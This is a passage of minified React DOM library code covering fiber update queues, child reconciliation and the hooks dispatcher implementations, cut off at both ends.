  }
}
function Mn(e, t) {
  (Kl = e),
    (ji = Tn = null),
    (e = e.dependencies),
    e !== null &&
      e.firstContext !== null &&
      (e.lanes & t && (Ce = !0), (e.firstContext = null));
}
function Ve(e) {
  var t = e._currentValue;
  if (ji !== e)
    if (((e = { context: e, memoizedValue: t, next: null }), Tn === null)) {
      if (Kl === null) throw Error(E(308));
      (Tn = e), (Kl.dependencies = { lanes: 0, firstContext: e });
    } else Tn = Tn.next = e;
  return t;
}
var nn = null;
function Fi(e) {
  nn === null ? (nn = [e]) : nn.push(e);
}
function Gc(e, t, n, r) {
  var l = t.interleaved;
  return (
    l === null ? ((n.next = n), Fi(t)) : ((n.next = l.next), (l.next = n)),
    (t.interleaved = n),
    kt(e, r)
  );
}
function kt(e, t) {
  e.lanes |= t;
  var n = e.alternate;
  for (n !== null && (n.lanes |= t), n = e, e = e.return; e !== null; )
    (e.childLanes |= t),
      (n = e.alternate),
      n !== null && (n.childLanes |= t),
      (n = e),
      (e = e.return);
  return n.tag === 3 ? n.stateNode : null;
}
var Tt = !1;
function Ri(e) {
  e.updateQueue = {
    baseState: e.memoizedState,
    firstBaseUpdate: null,
    lastBaseUpdate: null,
    shared: { pending: null, interleaved: null, lanes: 0 },
    effects: null,
  };
}
function Xc(e, t) {
  (e = e.updateQueue),
    t.updateQueue === e &&
      (t.updateQueue = {
        baseState: e.baseState,
        firstBaseUpdate: e.firstBaseUpdate,
        lastBaseUpdate: e.lastBaseUpdate,
        shared: e.shared,
        effects: e.effects,
      });
}
function yt(e, t) {
  return {
    eventTime: e,
    lane: t,
    tag: 0,
    payload: null,
    callback: null,
    next: null,
  };
}
function zt(e, t, n) {
  var r = e.updateQueue;
  if (r === null) return null;
  if (((r = r.shared), O & 2)) {
    var l = r.pending;
    return (
      l === null ? (t.next = t) : ((t.next = l.next), (l.next = t)),
      (r.pending = t),
      kt(e, n)
    );
  }
  return (
    (l = r.interleaved),
    l === null ? ((t.next = t), Fi(r)) : ((t.next = l.next), (l.next = t)),
    (r.interleaved = t),
    kt(e, n)
  );
}
function Cl(e, t, n) {
  if (
    ((t = t.updateQueue), t !== null && ((t = t.shared), (n & 4194240) !== 0))
  ) {
    var r = t.lanes;
    (r &= e.pendingLanes), (n |= r), (t.lanes = n), wi(e, n);
  }
}
function tu(e, t) {
  var n = e.updateQueue,
    r = e.alternate;
  if (r !== null && ((r = r.updateQueue), n === r)) {
    var l = null,
      a = null;
    if (((n = n.firstBaseUpdate), n !== null)) {
      do {
        var o = {
          eventTime: n.eventTime,
          lane: n.lane,
          tag: n.tag,
          payload: n.payload,
          callback: n.callback,
          next: null,
        };
        a === null ? (l = a = o) : (a = a.next = o), (n = n.next);
      } while (n !== null);
      a === null ? (l = a = t) : (a = a.next = t);
    } else l = a = t;
    (n = {
      baseState: r.baseState,
      firstBaseUpdate: l,
      lastBaseUpdate: a,
      shared: r.shared,
      effects: r.effects,
    }),
      (e.updateQueue = n);
    return;
  }
  (e = n.lastBaseUpdate),
    e === null ? (n.firstBaseUpdate = t) : (e.next = t),
    (n.lastBaseUpdate = t);
}
function Yl(e, t, n, r) {
  var l = e.updateQueue;
  Tt = !1;
  var a = l.firstBaseUpdate,
    o = l.lastBaseUpdate,
    i = l.shared.pending;
  if (i !== null) {
    l.shared.pending = null;
    var s = i,
      u = s.next;
    (s.next = null), o === null ? (a = u) : (o.next = u), (o = s);
    var d = e.alternate;
    d !== null &&
      ((d = d.updateQueue),
      (i = d.lastBaseUpdate),
      i !== o &&
        (i === null ? (d.firstBaseUpdate = u) : (i.next = u),
        (d.lastBaseUpdate = s)));
  }
  if (a !== null) {
    var v = l.baseState;
    (o = 0), (d = u = s = null), (i = a);
    do {
      var g = i.lane,
        y = i.eventTime;
      if ((r & g) === g) {
        d !== null &&
          (d = d.next =
            {
              eventTime: y,
              lane: 0,
              tag: i.tag,
              payload: i.payload,
              callback: i.callback,
              next: null,
            });
        e: {
          var w = e,
            x = i;
          switch (((g = t), (y = n), x.tag)) {
            case 1:
              if (((w = x.payload), typeof w == "function")) {
                v = w.call(y, v, g);
                break e;
              }
              v = w;
              break e;
            case 3:
              w.flags = (w.flags & -65537) | 128;
            case 0:
              if (
                ((w = x.payload),
                (g = typeof w == "function" ? w.call(y, v, g) : w),
                g == null)
              )
                break e;
              v = J({}, v, g);
              break e;
            case 2:
              Tt = !0;
          }
        }
        i.callback !== null &&
          i.lane !== 0 &&
          ((e.flags |= 64),
          (g = l.effects),
          g === null ? (l.effects = [i]) : g.push(i));
      } else
        (y = {
          eventTime: y,
          lane: g,
          tag: i.tag,
          payload: i.payload,
          callback: i.callback,
          next: null,
        }),
          d === null ? ((u = d = y), (s = v)) : (d = d.next = y),
          (o |= g);
      if (((i = i.next), i === null)) {
        if (((i = l.shared.pending), i === null)) break;
        (g = i),
          (i = g.next),
          (g.next = null),
          (l.lastBaseUpdate = g),
          (l.shared.pending = null);
      }
    } while (!0);
    if (
      (d === null && (s = v),
      (l.baseState = s),
      (l.firstBaseUpdate = u),
      (l.lastBaseUpdate = d),
      (t = l.shared.interleaved),
      t !== null)
    ) {
      l = t;
      do (o |= l.lane), (l = l.next);
      while (l !== t);
    } else a === null && (l.shared.lanes = 0);
    (pn |= o), (e.lanes = o), (e.memoizedState = v);
  }
}
function nu(e, t, n) {
  if (((e = t.effects), (t.effects = null), e !== null))
    for (t = 0; t < e.length; t++) {
      var r = e[t],
        l = r.callback;
      if (l !== null) {
        if (((r.callback = null), (r = n), typeof l != "function"))
          throw Error(E(191, l));
        l.call(r);
      }
    }
}
var Zc = new Gu.Component().refs;
function Oo(e, t, n, r) {
  (t = e.memoizedState),
    (n = n(r, t)),
    (n = n == null ? t : J({}, t, n)),
    (e.memoizedState = n),
    e.lanes === 0 && (e.updateQueue.baseState = n);
}
var pa = {
  isMounted: function (e) {
    return (e = e._reactInternals) ? vn(e) === e : !1;
  },
  enqueueSetState: function (e, t, n) {
    e = e._reactInternals;
    var r = ke(),
      l = Wt(e),
      a = yt(r, l);
    (a.payload = t),
      n != null && (a.callback = n),
      (t = zt(e, a, l)),
      t !== null && (rt(t, e, l, r), Cl(t, e, l));
  },
  enqueueReplaceState: function (e, t, n) {
    e = e._reactInternals;
    var r = ke(),
      l = Wt(e),
      a = yt(r, l);
    (a.tag = 1),
      (a.payload = t),
      n != null && (a.callback = n),
      (t = zt(e, a, l)),
      t !== null && (rt(t, e, l, r), Cl(t, e, l));
  },
  enqueueForceUpdate: function (e, t) {
    e = e._reactInternals;
    var n = ke(),
      r = Wt(e),
      l = yt(n, r);
    (l.tag = 2),
      t != null && (l.callback = t),
      (t = zt(e, l, r)),
      t !== null && (rt(t, e, r, n), Cl(t, e, r));
  },
};
function ru(e, t, n, r, l, a, o) {
  return (
    (e = e.stateNode),
    typeof e.shouldComponentUpdate == "function"
      ? e.shouldComponentUpdate(r, a, o)
      : t.prototype && t.prototype.isPureReactComponent
      ? !Fr(n, r) || !Fr(l, a)
      : !0
  );
}
function Jc(e, t, n) {
  var r = !1,
    l = Vt,
    a = t.contextType;
  return (
    typeof a == "object" && a !== null
      ? (a = Ve(a))
      : ((l = Te(t) ? cn : xe.current),
        (r = t.contextTypes),
        (a = (r = r != null) ? An(e, l) : Vt)),
    (t = new t(n, a)),
    (e.memoizedState = t.state !== null && t.state !== void 0 ? t.state : null),
    (t.updater = pa),
    (e.stateNode = t),
    (t._reactInternals = e),
    r &&
      ((e = e.stateNode),
      (e.__reactInternalMemoizedUnmaskedChildContext = l),
      (e.__reactInternalMemoizedMaskedChildContext = a)),
    t
  );
}
function lu(e, t, n, r) {
  (e = t.state),
    typeof t.componentWillReceiveProps == "function" &&
      t.componentWillReceiveProps(n, r),
    typeof t.UNSAFE_componentWillReceiveProps == "function" &&
      t.UNSAFE_componentWillReceiveProps(n, r),
    t.state !== e && pa.enqueueReplaceState(t, t.state, null);
}
function zo(e, t, n, r) {
  var l = e.stateNode;
  (l.props = n), (l.state = e.memoizedState), (l.refs = Zc), Ri(e);
  var a = t.contextType;
  typeof a == "object" && a !== null
    ? (l.context = Ve(a))
    : ((a = Te(t) ? cn : xe.current), (l.context = An(e, a))),
    (l.state = e.memoizedState),
    (a = t.getDerivedStateFromProps),
    typeof a == "function" && (Oo(e, t, a, n), (l.state = e.memoizedState)),
    typeof t.getDerivedStateFromProps == "function" ||
      typeof l.getSnapshotBeforeUpdate == "function" ||
      (typeof l.UNSAFE_componentWillMount != "function" &&
        typeof l.componentWillMount != "function") ||
      ((t = l.state),
      typeof l.componentWillMount == "function" && l.componentWillMount(),
      typeof l.UNSAFE_componentWillMount == "function" &&
        l.UNSAFE_componentWillMount(),
      t !== l.state && pa.enqueueReplaceState(l, l.state, null),
      Yl(e, n, l, r),
      (l.state = e.memoizedState)),
    typeof l.componentDidMount == "function" && (e.flags |= 4194308);
}
function ar(e, t, n) {
  if (
    ((e = n.ref), e !== null && typeof e != "function" && typeof e != "object")
  ) {
    if (n._owner) {
      if (((n = n._owner), n)) {
        if (n.tag !== 1) throw Error(E(309));
        var r = n.stateNode;
      }
      if (!r) throw Error(E(147, e));
      var l = r,
        a = "" + e;
      return t !== null &&
        t.ref !== null &&
        typeof t.ref == "function" &&
        t.ref._stringRef === a
        ? t.ref
        : ((t = function (o) {
            var i = l.refs;
            i === Zc && (i = l.refs = {}),
              o === null ? delete i[a] : (i[a] = o);
          }),
          (t._stringRef = a),
          t);
    }
    if (typeof e != "string") throw Error(E(284));
    if (!n._owner) throw Error(E(290, e));
  }
  return e;
}
function ml(e, t) {
  throw (
    ((e = Object.prototype.toString.call(t)),
    Error(
      E(
        31,
        e === "[object Object]"
          ? "object with keys {" + Object.keys(t).join(", ") + "}"
          : e
      )
    ))
  );
}
function au(e) {
  var t = e._init;
  return t(e._payload);
}
function qc(e) {
  function t(m, c) {
    if (e) {
      var h = m.deletions;
      h === null ? ((m.deletions = [c]), (m.flags |= 16)) : h.push(c);
    }
  }
  function n(m, c) {
    if (!e) return null;
    for (; c !== null; ) t(m, c), (c = c.sibling);
    return null;
  }
  function r(m, c) {
    for (m = new Map(); c !== null; )
      c.key !== null ? m.set(c.key, c) : m.set(c.index, c), (c = c.sibling);
    return m;
  }
  function l(m, c) {
    return (m = Ut(m, c)), (m.index = 0), (m.sibling = null), m;
  }
  function a(m, c, h) {
    return (
      (m.index = h),
      e
        ? ((h = m.alternate),
          h !== null
            ? ((h = h.index), h < c ? ((m.flags |= 2), c) : h)
            : ((m.flags |= 2), c))
        : ((m.flags |= 1048576), c)
    );
  }
  function o(m) {
    return e && m.alternate === null && (m.flags |= 2), m;
  }
  function i(m, c, h, b) {
    return c === null || c.tag !== 6
      ? ((c = Xa(h, m.mode, b)), (c.return = m), c)
      : ((c = l(c, h)), (c.return = m), c);
  }
  function s(m, c, h, b) {
    var S = h.type;
    return S === xn
      ? d(m, c, h.props.children, b, h.key)
      : c !== null &&
        (c.elementType === S ||
          (typeof S == "object" &&
            S !== null &&
            S.$$typeof === Pt &&
            au(S) === c.type))
      ? ((b = l(c, h.props)), (b.ref = ar(m, c, h)), (b.return = m), b)
      : ((b = _l(h.type, h.key, h.props, null, m.mode, b)),
        (b.ref = ar(m, c, h)),
        (b.return = m),
        b);
  }
  function u(m, c, h, b) {
    return c === null ||
      c.tag !== 4 ||
      c.stateNode.containerInfo !== h.containerInfo ||
      c.stateNode.implementation !== h.implementation
      ? ((c = Za(h, m.mode, b)), (c.return = m), c)
      : ((c = l(c, h.children || [])), (c.return = m), c);
  }
  function d(m, c, h, b, S) {
    return c === null || c.tag !== 7
      ? ((c = sn(h, m.mode, b, S)), (c.return = m), c)
      : ((c = l(c, h)), (c.return = m), c);
  }
  function v(m, c, h) {
    if ((typeof c == "string" && c !== "") || typeof c == "number")
      return (c = Xa("" + c, m.mode, h)), (c.return = m), c;
    if (typeof c == "object" && c !== null) {
      switch (c.$$typeof) {
        case rl:
          return (
            (h = _l(c.type, c.key, c.props, null, m.mode, h)),
            (h.ref = ar(m, null, c)),
            (h.return = m),
            h
          );
        case wn:
          return (c = Za(c, m.mode, h)), (c.return = m), c;
        case Pt:
          var b = c._init;
          return v(m, b(c._payload), h);
      }
      if (fr(c) || er(c))
        return (c = sn(c, m.mode, h, null)), (c.return = m), c;
      ml(m, c);
    }
    return null;
  }
  function g(m, c, h, b) {
    var S = c !== null ? c.key : null;
    if ((typeof h == "string" && h !== "") || typeof h == "number")
      return S !== null ? null : i(m, c, "" + h, b);
    if (typeof h == "object" && h !== null) {
      switch (h.$$typeof) {
        case rl:
          return h.key === S ? s(m, c, h, b) : null;
        case wn:
          return h.key === S ? u(m, c, h, b) : null;
        case Pt:
          return (S = h._init), g(m, c, S(h._payload), b);
      }
      if (fr(h) || er(h)) return S !== null ? null : d(m, c, h, b, null);
      ml(m, h);
    }
    return null;
  }
  function y(m, c, h, b, S) {
    if ((typeof b == "string" && b !== "") || typeof b == "number")
      return (m = m.get(h) || null), i(c, m, "" + b, S);
    if (typeof b == "object" && b !== null) {
      switch (b.$$typeof) {
        case rl:
          return (m = m.get(b.key === null ? h : b.key) || null), s(c, m, b, S);
        case wn:
          return (m = m.get(b.key === null ? h : b.key) || null), u(c, m, b, S);
        case Pt:
          var N = b._init;
          return y(m, c, h, N(b._payload), S);
      }
      if (fr(b) || er(b)) return (m = m.get(h) || null), d(c, m, b, S, null);
      ml(c, b);
    }
    return null;
  }
  function w(m, c, h, b) {
    for (
      var S = null, N = null, P = c, C = (c = 0), I = null;
      P !== null && C < h.length;
      C++
    ) {
      P.index > C ? ((I = P), (P = null)) : (I = P.sibling);
      var T = g(m, P, h[C], b);
      if (T === null) {
        P === null && (P = I);
        break;
      }
      e && P && T.alternate === null && t(m, P),
        (c = a(T, c, C)),
        N === null ? (S = T) : (N.sibling = T),
        (N = T),
        (P = I);
    }
    if (C === h.length) return n(m, P), Y && Jt(m, C), S;
    if (P === null) {
      for (; C < h.length; C++)
        (P = v(m, h[C], b)),
          P !== null &&
            ((c = a(P, c, C)), N === null ? (S = P) : (N.sibling = P), (N = P));
      return Y && Jt(m, C), S;
    }
    for (P = r(m, P); C < h.length; C++)
      (I = y(P, m, C, h[C], b)),
        I !== null &&
          (e && I.alternate !== null && P.delete(I.key === null ? C : I.key),
          (c = a(I, c, C)),
          N === null ? (S = I) : (N.sibling = I),
          (N = I));
    return (
      e &&
        P.forEach(function (A) {
          return t(m, A);
        }),
      Y && Jt(m, C),
      S
    );
  }
  function x(m, c, h, b) {
    var S = er(h);
    if (typeof S != "function") throw Error(E(150));
    if (((h = S.call(h)), h == null)) throw Error(E(151));
    for (
      var N = (S = null), P = c, C = (c = 0), I = null, T = h.next();
      P !== null && !T.done;
      C++, T = h.next()
    ) {
      P.index > C ? ((I = P), (P = null)) : (I = P.sibling);
      var A = g(m, P, T.value, b);
      if (A === null) {
        P === null && (P = I);
        break;
      }
      e && P && A.alternate === null && t(m, P),
        (c = a(A, c, C)),
        N === null ? (S = A) : (N.sibling = A),
        (N = A),
        (P = I);
    }
    if (T.done) return n(m, P), Y && Jt(m, C), S;
    if (P === null) {
      for (; !T.done; C++, T = h.next())
        (T = v(m, T.value, b)),
          T !== null &&
            ((c = a(T, c, C)), N === null ? (S = T) : (N.sibling = T), (N = T));
      return Y && Jt(m, C), S;
    }
    for (P = r(m, P); !T.done; C++, T = h.next())
      (T = y(P, m, C, T.value, b)),
        T !== null &&
          (e && T.alternate !== null && P.delete(T.key === null ? C : T.key),
          (c = a(T, c, C)),
          N === null ? (S = T) : (N.sibling = T),
          (N = T));
    return (
      e &&
        P.forEach(function (fe) {
          return t(m, fe);
        }),
      Y && Jt(m, C),
      S
    );
  }
  function k(m, c, h, b) {
    if (
      (typeof h == "object" &&
        h !== null &&
        h.type === xn &&
        h.key === null &&
        (h = h.props.children),
      typeof h == "object" && h !== null)
    ) {
      switch (h.$$typeof) {
        case rl:
          e: {
            for (var S = h.key, N = c; N !== null; ) {
              if (N.key === S) {
                if (((S = h.type), S === xn)) {
                  if (N.tag === 7) {
                    n(m, N.sibling),
                      (c = l(N, h.props.children)),
                      (c.return = m),
                      (m = c);
                    break e;
                  }
                } else if (
                  N.elementType === S ||
                  (typeof S == "object" &&
                    S !== null &&
                    S.$$typeof === Pt &&
                    au(S) === N.type)
                ) {
                  n(m, N.sibling),
                    (c = l(N, h.props)),
                    (c.ref = ar(m, N, h)),
                    (c.return = m),
                    (m = c);
                  break e;
                }
                n(m, N);
                break;
              } else t(m, N);
              N = N.sibling;
            }
            h.type === xn
              ? ((c = sn(h.props.children, m.mode, b, h.key)),
                (c.return = m),
                (m = c))
              : ((b = _l(h.type, h.key, h.props, null, m.mode, b)),
                (b.ref = ar(m, c, h)),
                (b.return = m),
                (m = b));
          }
          return o(m);
        case wn:
          e: {
            for (N = h.key; c !== null; ) {
              if (c.key === N)
                if (
                  c.tag === 4 &&
                  c.stateNode.containerInfo === h.containerInfo &&
                  c.stateNode.implementation === h.implementation
                ) {
                  n(m, c.sibling),
                    (c = l(c, h.children || [])),
                    (c.return = m),
                    (m = c);
                  break e;
                } else {
                  n(m, c);
                  break;
                }
              else t(m, c);
              c = c.sibling;
            }
            (c = Za(h, m.mode, b)), (c.return = m), (m = c);
          }
          return o(m);
        case Pt:
          return (N = h._init), k(m, c, N(h._payload), b);
      }
      if (fr(h)) return w(m, c, h, b);
      if (er(h)) return x(m, c, h, b);
      ml(m, h);
    }
    return (typeof h == "string" && h !== "") || typeof h == "number"
      ? ((h = "" + h),
        c !== null && c.tag === 6
          ? (n(m, c.sibling), (c = l(c, h)), (c.return = m), (m = c))
          : (n(m, c), (c = Xa(h, m.mode, b)), (c.return = m), (m = c)),
        o(m))
      : n(m, c);
  }
  return k;
}
var Un = qc(!0),
  ed = qc(!1),
  Gr = {},
  ct = Kt(Gr),
  Dr = Kt(Gr),
  Or = Kt(Gr);
function rn(e) {
  if (e === Gr) throw Error(E(174));
  return e;
}
function Ii(e, t) {
  switch ((B(Or, t), B(Dr, e), B(ct, Gr), (e = t.nodeType), e)) {
    case 9:
    case 11:
      t = (t = t.documentElement) ? t.namespaceURI : go(null, "");
      break;
    default:
      (e = e === 8 ? t.parentNode : t),
        (t = e.namespaceURI || null),
        (e = e.tagName),
        (t = go(t, e));
  }
  Q(ct), B(ct, t);
}
function Bn() {
  Q(ct), Q(Dr), Q(Or);
}
function td(e) {
  rn(Or.current);
  var t = rn(ct.current),
    n = go(t, e.type);
  t !== n && (B(Dr, e), B(ct, n));
}
function Mi(e) {
  Dr.current === e && (Q(ct), Q(Dr));
}
var X = Kt(0);
function Gl(e) {
  for (var t = e; t !== null; ) {
    if (t.tag === 13) {
      var n = t.memoizedState;
      if (
        n !== null &&
        ((n = n.dehydrated), n === null || n.data === "$?" || n.data === "$!")
      )
        return t;
    } else if (t.tag === 19 && t.memoizedProps.revealOrder !== void 0) {
      if (t.flags & 128) return t;
    } else if (t.child !== null) {
      (t.child.return = t), (t = t.child);
      continue;
    }
    if (t === e) break;
    for (; t.sibling === null; ) {
      if (t.return === null || t.return === e) return null;
      t = t.return;
    }
    (t.sibling.return = t.return), (t = t.sibling);
  }
  return null;
}
var Ha = [];
function Di() {
  for (var e = 0; e < Ha.length; e++)
    Ha[e]._workInProgressVersionPrimary = null;
  Ha.length = 0;
}
var Pl = Et.ReactCurrentDispatcher,
  Va = Et.ReactCurrentBatchConfig,
  fn = 0,
  Z = null,
  ie = null,
  ce = null,
  Xl = !1,
  br = !1,
  zr = 0,
  gm = 0;
function ve() {
  throw Error(E(321));
}
function Oi(e, t) {
  if (t === null) return !1;
  for (var n = 0; n < t.length && n < e.length; n++)
    if (!lt(e[n], t[n])) return !1;
  return !0;
}
function zi(e, t, n, r, l, a) {
  if (
    ((fn = a),
    (Z = t),
    (t.memoizedState = null),
    (t.updateQueue = null),
    (t.lanes = 0),
    (Pl.current = e === null || e.memoizedState === null ? bm : km),
    (e = n(r, l)),
    br)
  ) {
    a = 0;
    do {
      if (((br = !1), (zr = 0), 25 <= a)) throw Error(E(301));
      (a += 1),
        (ce = ie = null),
        (t.updateQueue = null),
        (Pl.current = Sm),
        (e = n(r, l));
    } while (br);
  }
  if (
    ((Pl.current = Zl),
    (t = ie !== null && ie.next !== null),
    (fn = 0),
    (ce = ie = Z = null),
    (Xl = !1),
    t)
  )
    throw Error(E(300));
  return e;
}
function Ai() {
  var e = zr !== 0;
  return (zr = 0), e;
}
function it() {
  var e = {
    memoizedState: null,
    baseState: null,
    baseQueue: null,
    queue: null,
    next: null,
  };
  return ce === null ? (Z.memoizedState = ce = e) : (ce = ce.next = e), ce;
}
function Qe() {
  if (ie === null) {
    var e = Z.alternate;
    e = e !== null ? e.memoizedState : null;
  } else e = ie.next;
  var t = ce === null ? Z.memoizedState : ce.next;
  if (t !== null) (ce = t), (ie = e);
  else {
    if (e === null) throw Error(E(310));
    (ie = e),
      (e = {
        memoizedState: ie.memoizedState,
        baseState: ie.baseState,
        baseQueue: ie.baseQueue,
        queue: ie.queue,
        next: null,
      }),
      ce === null ? (Z.memoizedState = ce = e) : (ce = ce.next = e);
  }
  return ce;
}
function Ar(e, t) {
  return typeof t == "function" ? t(e) : t;
}
function Qa(e) {
  var t = Qe(),
    n = t.queue;
  if (n === null) throw Error(E(311));
  n.lastRenderedReducer = e;
  var r = ie,
    l = r.baseQueue,
    a = n.pending;
  if (a !== null) {
    if (l !== null) {
      var o = l.next;
      (l.next = a.next), (a.next = o);
    }
    (r.baseQueue = l = a), (n.pending = null);
  }
  if (l !== null) {
    (a = l.next), (r = r.baseState);
    var i = (o = null),
      s = null,
      u = a;
    do {
      var d = u.lane;
      if ((fn & d) === d)
        s !== null &&
          (s = s.next =
            {
              lane: 0,
              action: u.action,
              hasEagerState: u.hasEagerState,
              eagerState: u.eagerState,
              next: null,
            }),
          (r = u.hasEagerState ? u.eagerState : e(r, u.action));
      else {
        var v = {
          lane: d,
          action: u.action,
          hasEagerState: u.hasEagerState,
          eagerState: u.eagerState,
          next: null,
        };
        s === null ? ((i = s = v), (o = r)) : (s = s.next = v),
          (Z.lanes |= d),
          (pn |= d);
      }
      u = u.next;
    } while (u !== null && u !== a);
    s === null ? (o = r) : (s.next = i),
      lt(r, t.memoizedState) || (Ce = !0),
      (t.memoizedState = r),
      (t.baseState = o),
      (t.baseQueue = s),
      (n.lastRenderedState = r);
  }
  if (((e = n.interleaved), e !== null)) {
    l = e;
    do (a = l.lane), (Z.lanes |= a), (pn |= a), (l = l.next);
    while (l !== e);
  } else l === null && (n.lanes = 0);
  return [t.memoizedState, n.dispatch];
}
function Ka(e) {
  var t = Qe(),
    n = t.queue;
  if (n === null) throw Error(E(311));
  n.lastRenderedReducer = e;
  var r = n.dispatch,
    l = n.pending,
    a = t.memoizedState;
  if (l !== null) {
    n.pending = null;
    var o = (l = l.next);
    do (a = e(a, o.action)), (o = o.next);
    while (o !== l);
    lt(a, t.memoizedState) || (Ce = !0),
      (t.memoizedState = a),
      t.baseQueue === null && (t.baseState = a),
      (n.lastRenderedState = a);
  }
  return [a, r];
}
function nd() {}
function rd(e, t) {
  var n = Z,
    r = Qe(),
    l = t(),
    a = !lt(r.memoizedState, l);
  if (
    (a && ((r.memoizedState = l), (Ce = !0)),
    (r = r.queue),
    Wi(od.bind(null, n, r, e), [e]),
    r.getSnapshot !== t || a || (ce !== null && ce.memoizedState.tag & 1))
  ) {
    if (
      ((n.flags |= 2048),
      Wr(9, ad.bind(null, n, r, l, t), void 0, null),
      de === null)
    )
      throw Error(E(349));
    fn & 30 || ld(n, t, l);
  }
  return l;
}
function ld(e, t, n) {
  (e.flags |= 16384),
    (e = { getSnapshot: t, value: n }),
    (t = Z.updateQueue),
    t === null
      ? ((t = { lastEffect: null, stores: null }),
        (Z.updateQueue = t),
        (t.stores = [e]))
      : ((n = t.stores), n === null ? (t.stores = [e]) : n.push(e));
}
function ad(e, t, n, r) {
  (t.value = n), (t.getSnapshot = r), id(t) && sd(e);
}
function od(e, t, n) {
  return n(function () {
    id(t) && sd(e);
  });
}
function id(e) {
  var t = e.getSnapshot;
  e = e.value;
  try {
    var n = t();
    return !lt(e, n);
  } catch {
    return !0;
  }
}
function sd(e) {
  var t = kt(e, 1);
  t !== null && rt(t, e, 1, -1);
}
function ou(e) {
  var t = it();
  return (
    typeof e == "function" && (e = e()),
    (t.memoizedState = t.baseState = e),
    (e = {
      pending: null,
      interleaved: null,
      lanes: 0,
      dispatch: null,
      lastRenderedReducer: Ar,
      lastRenderedState: e,
    }),
    (t.queue = e),
    (e = e.dispatch = xm.bind(null, Z, e)),
    [t.memoizedState, e]
  );
}
function Wr(e, t, n, r) {
  return (
    (e = { tag: e, create: t, destroy: n, deps: r, next: null }),
    (t = Z.updateQueue),
    t === null
      ? ((t = { lastEffect: null, stores: null }),
        (Z.updateQueue = t),
        (t.lastEffect = e.next = e))
      : ((n = t.lastEffect),
        n === null
          ? (t.lastEffect = e.next = e)
          : ((r = n.next), (n.next = e), (e.next = r), (t.lastEffect = e))),
    e
  );
}
function ud() {
  return Qe().memoizedState;
}
function Tl(e, t, n, r) {
  var l = it();
  (Z.flags |= e),
    (l.memoizedState = Wr(1 | t, n, void 0, r === void 0 ? null : r));
}
function ma(e, t, n, r) {
  var l = Qe();
  r = r === void 0 ? null : r;
  var a = void 0;
  if (ie !== null) {
    var o = ie.memoizedState;
    if (((a = o.destroy), r !== null && Oi(r, o.deps))) {
      l.memoizedState = Wr(t, n, a, r);
      return;
    }
  }
  (Z.flags |= e), (l.memoizedState = Wr(1 | t, n, a, r));
}
function iu(e, t) {
  return Tl(8390656, 8, e, t);
}
function Wi(e, t) {
  return ma(2048, 8, e, t);
}
function cd(e, t) {
  return ma(4, 2, e, t);
}
function dd(e, t) {
  return ma(4, 4, e, t);
}
function fd(e, t) {
  if (typeof t == "function")
    return (
      (e = e()),
      t(e),
      function () {
        t(null);
      }
    );
  if (t != null)
    return (
      (e = e()),
      (t.current = e),
      function () {
        t.current = null;
      }
    );
}
function pd(e, t, n) {
  return (
    (n = n != null ? n.concat([e]) : null), ma(4, 4, fd.bind(null, t, e), n)
  );
}
function Ui() {}
function md(e, t) {
  var n = Qe();
  t = t === void 0 ? null : t;
  var r = n.memoizedState;
  return r !== null && t !== null && Oi(t, r[1])
    ? r[0]
    : ((n.memoizedState = [e, t]), e);
}
function hd(e, t) {
  var n = Qe();
  t = t === void 0 ? null : t;
  var r = n.memoizedState;
  return r !== null && t !== null && Oi(t, r[1])
    ? r[0]
    : ((e = e()), (n.memoizedState = [e, t]), e);
}
function vd(e, t, n) {
  return fn & 21
    ? (lt(n, t) || ((n = wc()), (Z.lanes |= n), (pn |= n), (e.baseState = !0)),
      t)
    : (e.baseState && ((e.baseState = !1), (Ce = !0)), (e.memoizedState = n));
}
function ym(e, t) {
  var n = z;
  (z = n !== 0 && 4 > n ? n : 4), e(!0);
  var r = Va.transition;
  Va.transition = {};
  try {
    e(!1), t();
  } finally {
    (z = n), (Va.transition = r);
  }
}
function gd() {
  return Qe().memoizedState;
}
function wm(e, t, n) {
  var r = Wt(e);
  if (
    ((n = {
      lane: r,
      action: n,
      hasEagerState: !1,
      eagerState: null,
      next: null,
    }),
    yd(e))
  )
    wd(t, n);
  else if (((n = Gc(e, t, n, r)), n !== null)) {
    var l = ke();
    rt(n, e, r, l), xd(n, t, r);
  }
}
function xm(e, t, n) {
  var r = Wt(e),
    l = { lane: r, action: n, hasEagerState: !1, eagerState: null, next: null };
  if (yd(e)) wd(t, l);
  else {
    var a = e.alternate;
    if (
      e.lanes === 0 &&
      (a === null || a.lanes === 0) &&
      ((a = t.lastRenderedReducer), a !== null)
    )
      try {
        var o = t.lastRenderedState,
          i = a(o, n);
        if (((l.hasEagerState = !0), (l.eagerState = i), lt(i, o))) {
          var s = t.interleaved;
          s === null
            ? ((l.next = l), Fi(t))
            : ((l.next = s.next), (s.next = l)),
            (t.interleaved = l);
          return;
        }
      } catch {
      } finally {
      }
    (n = Gc(e, t, l, r)),
      n !== null && ((l = ke()), rt(n, e, r, l), xd(n, t, r));
  }
}
function yd(e) {
  var t = e.alternate;
  return e === Z || (t !== null && t === Z);
}
function wd(e, t) {
  br = Xl = !0;
  var n = e.pending;
  n === null ? (t.next = t) : ((t.next = n.next), (n.next = t)),
    (e.pending = t);
}
function xd(e, t, n) {
  if (n & 4194240) {
    var r = t.lanes;
    (r &= e.pendingLanes), (n |= r), (t.lanes = n), wi(e, n);
  }
}
var Zl = {
    readContext: Ve,
    useCallback: ve,
    useContext: ve,
    useEffect: ve,
    useImperativeHandle: ve,
    useInsertionEffect: ve,
    useLayoutEffect: ve,
    useMemo: ve,
    useReducer: ve,
    useRef: ve,
    useState: ve,
    useDebugValue: ve,
    useDeferredValue: ve,
    useTransition: ve,
    useMutableSource: ve,
    useSyncExternalStore: ve,
    useId: ve,
    unstable_isNewReconciler: !1,
  },
  bm = {
    readContext: Ve,
    useCallback: function (e, t) {
      return (it().memoizedState = [e, t === void 0 ? null : t]), e;
    },
    useContext: Ve,
    useEffect: iu,
    useImperativeHandle: function (e, t, n) {
      return (
        (n = n != null ? n.concat([e]) : null),
        Tl(4194308, 4, fd.bind(null, t, e), n)
      );
    },
    useLayoutEffect: function (e, t) {
      return Tl(4194308, 4, e, t);
    },
    useInsertionEffect: function (e, t) {
      return Tl(4, 2, e, t);
    },
    useMemo: function (e, t) {
      var n = it();
      return (
        (t = t === void 0 ? null : t), (e = e()), (n.memoizedState = [e, t]), e
      );
    },
    useReducer: function (e, t, n) {
      var r = it();
      return (
        (t = n !== void 0 ? n(t) : t),
        (r.memoizedState = r.baseState = t),
        (e = {
          pending: null,
          interleaved: null,
          lanes: 0,
          dispatch: null,
          lastRenderedReducer: e,
